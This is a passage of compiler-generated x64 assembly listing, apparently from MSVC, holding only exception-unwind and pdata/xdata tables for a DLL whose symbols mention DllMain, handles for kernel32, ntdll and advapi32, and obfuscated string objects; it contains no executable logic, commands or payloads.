	DD	imagerel $unwind$?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ DD imagerel ??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ+111
	DD	imagerel $unwind$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ DB 02H
	DB	0acH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DB 04H
	DB	0a8H
	DB	02H
	DB	']', 04H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DB 028H
	DD	imagerel $stateUnwindMap$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel $ip2state$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ DB 02H
	DB	0a6H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DB 04H
	DB	0a2H
	DB	02H
	DB	'i', 04H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DB 028H
	DD	imagerel $stateUnwindMap$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel $ip2state$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ DB 02H
	DB	0acH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DB 04H
	DB	0a8H
	DB	02H
	DB	']', 04H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DB 028H
	DD	imagerel $stateUnwindMap$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel $ip2state$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$DllMain$dtor$10 DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$DllMain$dtor$5 DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$DllMain$dtor$4 DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$DllMain DB 01eH
	DB	'z'
	DB	00H
	DB	'e', 03H
	DB	02H
	DB	','
	DB	00H
	DB	'y', 02H
	DB	04H
	DB	'2'
	DB	00H
	DB	0c9H, 02H
	DB	06H
	DB	085H, 02H
	DB	08H
	DB	0b5H, 02H
	DB	0aH
	DB	05H, 02H
	DB	0cH
	DB	'v'
	DB	0aH
	DB	09cH
	DB	08H
	DB	08dH, 03H
	DB	00H
	DB	'P'
	DB	06H
	DB	018H
	DB	08H
	DB	'$'
	DB	06H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$DllMain DB 0cH
	DB	0eH
	DD	imagerel DllMain$dtor$4
	DB	036H
	DD	imagerel DllMain$dtor$5
	DB	05aH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	061H
	DB	04H
	DB	03aH
	DD	imagerel ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
	DB	0e1H
	DB	03H
	DB	03aH
	DD	imagerel ??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ
	DB	081H
	DB	03H
	DB	03eH
	DD	imagerel DllMain$dtor$10
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$DllMain DB 028H
	DD	imagerel $stateUnwindMap$DllMain
	DD	imagerel $ip2state$DllMain
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$DllMain DD 0b3419H
	DD	0407423H
	DD	03f6423H
	DD	03e3423H
	DD	03a0123H
	DD	0c012e014H
	DD	05010H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$DllMain
	DD	01caH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ DB 02H
	DB	09dH, 02H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ DD 020611H
	DD	030029206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ DB 02H
	DB	0e0H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ DD 020611H
	DD	030027206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAPEADXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAPEADXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DD 081201H
	DD	0a5412H
	DD	093412H
	DD	0e00e3212H
	DD	0600b700cH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$vector@_WV?$allocator@_W@std@@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DD 081301H
	DD	0a6413H
	DD	093413H
	DD	0f00f3213H
	DD	0700be00dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_from_iter@PEADPEAD_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXPEADQEAD_K@Z DD 081201H
	DD	0a5412H
	DD	093412H
	DD	0e00e3212H
	DD	0600b700cH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD 040021H
	DD	047400H
	DD	053400H
	DD	imagerel $LN109
	DD	imagerel $LN109+46
	DD	imagerel $unwind$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD 021H
	DD	imagerel $LN109
	DD	imagerel $LN109+46
	DD	imagerel $unwind$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD 040021H
	DD	047400H
	DD	053400H
	DD	imagerel $LN109
	DD	imagerel $LN109+46
	DD	imagerel $unwind$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD 021H
	DD	imagerel $LN109
	DD	imagerel $LN109+46
	DD	imagerel $unwind$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD 040e21H
	DD	04740eH
	DD	053405H
	DD	imagerel $LN109
	DD	imagerel $LN109+46
	DD	imagerel $unwind$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD 041201H
	DD	0f00e5212H
	DD	0600ae00cH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z DD 021H
	DD	imagerel $LN160
	DD	imagerel $LN160+68
	DD	imagerel $unwind$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z DD 080021H
	DD	04e400H
	DD	05c400H
	DD	066400H
	DD	0e3400H
	DD	imagerel $LN160
	DD	imagerel $LN160+68
	DD	imagerel $unwind$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z DD 082721H
	DD	04e427H
	DD	05c415H
	DD	06640dH
	DD	0e3405H
	DD	imagerel $LN160
	DD	imagerel $LN160+68
	DD	imagerel $unwind$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z DD 050b01H
	DD	0f007620bH
	DD	07003d005H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Tidy_guard@V?$vector@_WV?$allocator@_W@std@@@std@@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Tidy_deallocate_guard@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z DD 081401H
	DD	096414H
	DD	085414H
	DD	073414H
	DD	070103214H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD 020021H
	DD	083400H
	DD	imagerel $LN50
	DD	imagerel $LN50+24
	DD	imagerel $unwind$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD 021H
	DD	imagerel $LN50
	DD	imagerel $LN50+24
	DD	imagerel $unwind$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD 020521H
	DD	083405H
	DD	imagerel $LN50
	DD	imagerel $LN50+24
	DD	imagerel $unwind$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD 020601H
	DD	070023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Buy_raw@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Uninitialized_copy@PEA_WPEA_WV?$allocator@_W@std@@@std@@YAPEA_WPEA_W00AEAV?$allocator@_W@0@@Z DD 040a01H
	DD	09340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
